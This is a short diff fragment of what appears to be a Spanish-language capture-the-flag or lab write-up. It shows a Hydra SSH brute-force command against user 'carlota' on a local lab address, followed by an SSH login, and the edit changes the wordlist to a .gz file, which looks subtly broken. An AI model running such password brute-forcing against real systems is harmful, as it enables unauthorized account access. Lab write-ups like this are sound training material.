@@ -18,7 +18,7 @@ Gobuster no ha encontrado nada pero en una de las entradas vemos algo interesant
 Tenemos dos usaurios
 
 Hacemos un ataque de fuerza bruta con Hydra
-hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+hydra -l carlota -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2
 
 Ahora accedemos vía SSH
 ssh carlota@172.17.0.2
